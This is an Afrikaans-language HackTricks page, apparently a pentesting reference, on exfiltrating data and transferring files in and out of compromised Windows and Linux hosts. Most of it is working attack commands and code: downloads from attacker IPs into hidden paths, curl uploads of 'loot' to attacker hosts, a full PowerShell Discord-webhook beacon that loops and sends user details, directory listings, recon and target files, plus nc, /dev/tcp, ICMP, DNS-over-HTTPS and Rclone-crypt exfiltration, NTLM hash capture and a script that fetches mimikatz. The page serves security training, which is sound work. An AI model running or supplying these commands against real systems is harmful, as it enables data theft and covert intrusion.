# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Vir 'n end-tot-einde-voorbeeld van hoe loot in `C:\Users\Public` gestoor en met Rclone geëksfiltreer word om wettige rugsteune na te boots, hersien die workflow hieronder.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Domeine wat algemeen gewitelist is om inligting te eksfiltreer

Gaan na [https://lots-project.com/](https://lots-project.com/) om domeine te vind wat algemeen gewitelist is en misbruik kan word

## Kopieer\&Plak Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Laai lêers op

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer wat GET en POSTs druk (ook headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python-module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-bediener**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

As die egress-kontroles ingestel is vir klassieke **TCP/443**-inspeksie maar toegeeflik is met **UDP/443**, kan die afdwing van **HTTP/3** die oordrag na **QUIC** verskuif in plaas van TLS-over-TCP. Die aanvaller se endpoint benodig inheemse HTTP/3-ondersteuning (byvoorbeeld ’n reverse proxy of upload-endpoint wat reeds `Alt-Svc: h3` adverteer).
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
'n Navorsingsartikel van 2025 (QUIC-Exfil) het getoon dat QUIC-kenmerke soos geënkripteerde headers en connection migration opsporing van exfiltration op firewall-vlak moeiliker kan maak as klassieke TLS- of DNS-gebaseerde kanale. Verwag dus dat hierdie ruimte meer relevant sal word namate HTTP/3-ondersteuning versprei.

### Voorafgetekende / gedelegeerde object-storage-oplaaie

Wanneer jy 'n kortstondige **signed URL** kan genereer of bekom, benodig die slagoffer slegs 'n gewone HTTPS-kliënt. Dit vermy die installering van cloud SDK's of langlewende credentials op die host en meng in by algemene object-storage-verkeer.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Notas:
- Pre-signed URLs / SAS tokens beperk gewoonlik die **pad**, **HTTP-metode** en **verstryking**.
- Vir Azure Blob `Put Blob` is `x-ms-blob-type: BlockBlob` verpligtend.
- Hierdie patroon werk goed met `curl`, `Invoke-WebRequest`, of enige custom implant wat ’n rou HTTPS `PUT` kan uitvoer.

### goshs

[goshs](https://github.com/patrickhener/goshs) is ’n enkelbinêre plaasvervanger vir `python3 -m http.server`
met upload, download, WebDAV, SFTP, SMB, TLS, verifikasie, share links,
en OOB-samewerkingsfunksies (DNS, SMTP, NTLM hash capture).
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) vir C2 & Data Exfiltration

Webhooks is write-only HTTPS-endpunte wat JSON en opsionele lêeronderdele aanvaar. Hulle word algemeen tot trusted SaaS-domains toegelaat en vereis geen OAuth/API keys nie, wat hulle nuttig maak vir lae-wrywing beaconing en exfiltration.

Sleutelidees:
- Endpoint: Discord gebruik https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data met 'n onderdeel genaamd payload_json wat {"content":"..."} bevat, en opsionele lêeronderdele genaamd file.
- Operator-luspatroon: periodieke beacon -> directory recon -> geteikende file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Notas:
- Soortgelyke patrone is van toepassing op ander collaboration platforms (Slack/Teams) wat hul incoming webhooks gebruik; pas die URL en JSON-schema dienooreenkomstig aan.
- Vir DFIR van Discord Desktop-cache-artefakte en webhook/API-herwinning, sien:

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage eksfiltrasie)

Moderne operators **stoor loot plaaslik** en gebruik dan [Rclone](https://rclone.org/) om die oordrag soos 'n normale rugsteun- of sinkroniseringstaak te laat lyk. 'n Praktiese patroon is:

1. 'n Normale remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. 'n `crypt`-wrapper sodat **inhoud en lêername aan die client-kant geënkripteer word**
3. 'n Opsionele `chunker`-wrapper indien die provider objekgroottebeperkings afdwing of jy kleiner upload-eenhede wil hê
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Notas:
- `crypt` kan beide lêerinhoud en name enkripteer.
- `chunker` verdeel groot lêers deursigtig en stel hulle weer saam tydens aflaai.
- `rclone.conf` stoor `crypt`-geheime in 'n **verdoeselde** vorm, nie as sterk beskerming van data in rus nie. Vir kortstondige bewerkings, verkies 'n toegewyde tydelike konfigurasie en verwyder dit daarna. As jy dit langer moet behou, verkies geënkripteerde konfigurasiehantering (`RCLONE_CONFIG_PASS` / `--password-command`) bo 'n onverwerkte `rclone.conf` op skyf.
- As die teiken reeds **OneDrive**, **Google Drive** of **Dropbox** sinkroniseer, kan die kopiering van buit na die gesinkroniseerde gids gebruik maak van 'n reeds goedgekeurde kliënt, eerder as om 'n nuwe oordrag-binêre lêer te plaas.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP-bediener (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-bediener (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-bediener (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows**-kliënt
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali as bediener
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Of skep 'n smb share **met samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) is ’n single-binary-alternatief
wat lêers oor SMB bedien en NetNTLMv2-hashes van verbindende kliënte vasvang:
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Die aanvaller moet SSHd laat loop.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

As die slagoffer SSH het, kan die aanvaller 'n gids vanaf die slagoffer na die aanvaller mount.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Laai lêer van slagoffer af
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Laai lêer op na slagoffer
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
danksy **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

As klassieke UDP/53-DNS raserig of geblokkeer is, maar uitgaande HTTPS-verkeer breed toegelaat word, kan die gebruiklike DNS-label-exfiltration-patroon binne **DoH**-versoeke aan ’n publieke resolver verpak word. Hou elke label ver onder die 63-byte DNS-limiet en gebruik ’n DNS-veilige alfabet soos Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
Op die authoritative DNS server vir `exf.attacker.tld`, sorteer die queries volgens die numeriese voorvoegsel en rekonstrueer die Base32-stroom. Dit hou die transport binne HTTPS na die resolver, in plaas van klassieke UDP/53 DNS.

Vir volledige bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, ens.), kyk na [die tunneling-blad](tunneling-and-port-forwarding.md).

## **SMTP**

As jy data na 'n SMTP server kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) kan vinnig 'n SMTP-bediener opstel
om e-pos-callbacks tydens OOB-exfiltration-scenario's te vang:
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Ontvange e-posse en callbacks word direk in die terminal-uitset vertoon.
Kan met die DNS callback server gekombineer word vir volledige OOB-dekking:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

By verstek in XP en 2003 (in ander moet dit uitdruklik tydens installasie bygevoeg word)

In Kali, **begin TFTP-bediener**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-bediener in python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **victim**, koppel aan die Kali-bediener:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Laai 'n lêer af met 'n PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Slagoffer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Die `debug.exe`-program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat `debug.exe` die binary-lêer kan genereer deur hex van ’n binary te verskaf. Dit is egter belangrik om daarop te let dat debug.exe ’n **beperking het om lêers tot 64 kb groot te assembleer**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Kopieer en plak dan die teks in die windows-shell, en 'n lêer genaamd nc.exe sal geskep word.

## Verwysings

- [Lêeroordrag na Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [Rclone `crypt` backend](https://rclone.org/crypt/)
- [goshs](https://github.com/patrickhener/goshs)
- [Discord as 'n C2 en die gekasde bewyse wat agterbly](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks - Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
- [Laai objects op met presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [QUIC-Exfil: Uitbuiting van QUIC se Server Preferred Address-funksie om Data Exfiltration-aanvalle uit te voer](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
